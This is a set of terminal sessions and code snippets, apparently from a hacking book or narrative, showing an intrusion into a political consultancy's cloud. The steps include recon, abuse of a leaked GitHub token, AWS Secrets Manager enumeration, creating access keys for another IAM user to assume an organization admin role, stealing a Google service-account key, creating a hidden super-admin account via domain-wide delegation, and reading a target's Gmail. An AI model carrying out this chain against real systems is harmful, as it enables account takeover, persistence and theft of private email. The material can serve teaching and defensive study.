["```\nroot@Point1:~/# **dig +short gretschpolitico.com MX**\n10 aspmx.l.google.com.\n20 alt2.aspmx.l.google.com.\n30 aspmx3.googlemail.com.\n20 alt1.aspmx.l.google.com.\n30 aspmx2.googlemail.com.\n```", "```\n# list_repos.py\nfrom github import Github\ng = Github(\"8e24ffcc0eeddee673ffa0ce5433ffcee7ace561\")\nfor repo in g.get_user().get_repos():\n    print(repo.name, repo.clone_url)\n\nroot@Point1:~/# **python3 list_repos.py > list_repos_gp.txt**\nroot@Point1:~/# **egrep -i \"it[-_]|gapps|gsuite|users?\" list_repos_gp.txt**\n\nit-service     https://github.com/gretschp/it-service.git\n1 it-gsuite-apps https://github.com/gretschp/it-gsuite-apps.git\nusers-sync     https://github.com/gretschp/users-sync\n`--snip--`\n```", "```\nroot@Point1:~/# **ls -lh it-gsuite-apps**\n\ntotal 98M\ndrwxrwxrwx 1 root root   7.9M  provisionner\ndrwxrwxrwx 1 root root  13.4M  cron-tasks\ndrwxrwxrwx 1 root root   6.3M  assign-ou\n`--snip--`\n```", "```\nroot@Point1:~/it-gsuite-apps/# **grep -Ri \"BEGIN PRIVATE KEY\" ***\nroot@Point1:~/it-gsuite-apps/#\n```", "```\n`--snip--`\ngetSecret(SERVICE_TOKEN);\n`--snip--`\npublic static void getSecret(String token) {\n  String secretName = token;\n  String endpoint = \"secretsmanager.eu-west-1.amazonaws.com\";\n  String region = \"eu-west-1\";\n\n  AwsClientBuilder.EndpointConfiguration config = new AwsClientBuilder.EndpointConfiguration(endpoint, region);\n`--snip--`\n```", "```\nroot@Point1:~/# **aws secretsmanager list-secrets \\**\n**--region eu-west-1 \\**\n**--profile rundeck**\n\n\"Name\": \"inf/instance-api/api-token\",\n\"Name\": \"inf/rundeck/mysql/test_user\",\n\"Name\": \"inf/rundeck/cleanlog/apikey\",\n\"Name\": \"inf/openvpn/vpn-employees\",\n`--snip--`\n```", "```\nroot@Point1:~/# **aws organizations list-accounts**\n\"Accounts\": [\n   Id: 983457354409, Name: GP Infra, Email: infra-admin@gre...\n   Id: 354899546107, Name: GP Lab, Email: gp-lab@gretschpoli...\n 1 Id: 345673068670, Name: GP IT, Email: admin-it@gretschpoli...\n`--snip—`\n```", "```\nroot@Point1:~/# **aws sts assume-role \\**\n**--role-session-name maintenance \\**\n**--role-arn arn:aws:iam::345673068670:role/OrganizationAccountAccessRole \\**\n**--profile rundeck**\n\nAn error occurred (AccessDenied) when calling the AssumeRole operation...\n```", "```\nroot@Point1:~/# **aws logs describe-log-groups \\**\n**--region=eu-west-1 \\**\n**--profile test**\n--`snip`--\nlogGroupName: CloudTrail/DefaultLogGroup\n`--snip--`\n```", "```\nroot@Point1**:~/# aws logs filter-log-events \\**\n**--log-group-name \"CloudTrail/DefaultLogGroup\" \\**\n**--filter-pattern \"345673068670\" \\**\n**--max-items 10 \\**\n**--profile rundeck \\**\n**--region eu-west-1 \\**\n**| jq \".events[].message\" \\**\n**| sed 's/\\\\//g'**\n\n\"userIdentity\": {\n    \"type\": \"IAMUser\",\n    \"arn\": \"arn:aws:iam:: 983457354409:user/elis.skyler\",\n    \"accountId\": \"983457354409\",\n    \"accessKeyId\": \"AKIA44ZRK6WS4G7MGL6W\",\n  1   \"userName\": \"elis.skyler\"\n},\n\"requestParameters\": {\n     \"roleArn\": \"arn:aws:iam::345673068670:role/OrganizationAccountAccessRole\",\n    \"responseElements\": {\"credentials\": {\n`--snip--`\n```", "```\nroot@Point1:~/# **aws iam create-access-key \\**\n**--user-name elis.skyler \\**\n**--profile rundeck**\n\nAccessKey: {\n    UserName: elis.skyler,\n    AccessKeyId: AKIA44ZRK6WSRDLX7TDS,\n    SecretAccessKey: 564//eyApoe96Dkv0DEdgAwroelak78eghk\n```", "```\nroot@Point1:~/# **aws sts assume-role \\**\n**--role-session-name maintenance \\**\n**--role-arn arn:aws:iam::345673068670:role/OrganizationAccountAccessRole \\**\n**--profile elis \\**\n**--duration-seconds 43 200**\n\nAccessKeyId: ASIAU6EUDNIZIADAP6BQ,\nSecretAccessKey: xn37rimJEAppjDicZZP19h0hLuT02P06SXZxeHbk,\nSessionToken: FwoGZXIvYXdzEGwa...\n```", "```\nroot@Point1:~/# **aws secretsmanager list-secrets \\**\n**--region eu-west-1 \\**\n**--profile it-role**\n\nARN: arn:aws:secretsmanager:eu-west-1: 345673068670:secret:it/\ngsuite-apps/user-provisionning-4OYxPA\n\nName: it/gsuite-apps/user-provisioning,\n`--snip--`\n```", "```\nroot@Point1:~/# **aws secretsmanager get-secret-value \\**\n**--secret-id 'arn:aws:secretsmanager:eu-west-1:345673068670:secret:it/ \\**\n**gsuite-apps/user-provisionning-4OYxPA' \\**\n**--region=eu-west-1 \\**\n**--profile it-role \\**\n**| jq -r .SecretString | base64 -d**\n\n{\n    \"type\": \"service_account\",\n    \"project_id\": \"gp-gsuite-262115\",\n    \"private_key_id\": \"05a85fd168856773743ed7ccf8828a522a00fc8f\",\n    \"private_key\": \"-----BEGIN PRIVATE KEY-----... \",\n    \"client_email\": \"userprovisionning@gp-gsuite-262115.iam.gserviceaccount.com\",\n    \"client_id\": \"100598087991069411291\",\n`--snip--`\n```", "```\nSCOPES =['https://www.googleapis.com/auth/admin.directory.user']\nSERVICE_ACCOUNT_FILE = 'token.json'\nUSER_EMAIL = \"admin-it@gretschpolitico.com\"\n```", "```\ncredentials = (service_account.Credentials.\n                from_service_account_file(SERVICE_ACCOUNT_FILE, scopes=SCOPES))\n\ndelegated_credentials = credentials.with_subject(USER_EMAIL)\nservice = discovery.build('admin', 'directory_v1', credentials=delegated_credentials)\n```", "```\nuser = {\"name\": {\"familyName\": \"Burton\", \"givenName\": \"Haniel\",},\n        \"password\": \"Strong45Password*\", \"primaryEmail\": \"hanielle@gretschpolitico.com\",\n        \"orgUnitPath\": \"/\" }\n\nresult = service.users().insert(body=user).execute()\n```", "```\nservice.users().makeAdmin(userKey=\"hanielle@gretschpolitico.com\",\n                          body={\"status\": True}).execute()\n```", "```\nroot@Point1:~/# **python create_user.py**\n```", "```\nUSER_EMAIL = 'alexandra.styx@gretschpolitico.com'\nservice = discovery.build(1'gmail', 'v1', credentials=delegated_credentials)\n2 results = service.users().messages().list(\n                    userId=USER_EMAIL,\n                    labelIds = ['INBOX']).execute()\n\nmessages = results.get('messages', [])\n```", "```\nroot@Point1:~/# **python gmail.py**\nalexandra.styx@gretschpolitico.com;\nvalery.attenbourough@gretschpolitico.com;\nSun, 15 Dec 2020;\nSecured the party’s contract – $2M!\n\nWe just closed the contract today! We can start targeting PA undecided voters tomorrow!\n\n---\n\nalexandra.styx@gretschpolitico.com;\nadam.sparrow@gretschpolitico.com;\nSun, 12 Dec 2020;\nWe need to go after his public image\n\nCan't we make up a story? Send some girls, champagne and kickstart it\nthat way? We have the creatives ready, we need to get moving!!!\n```"]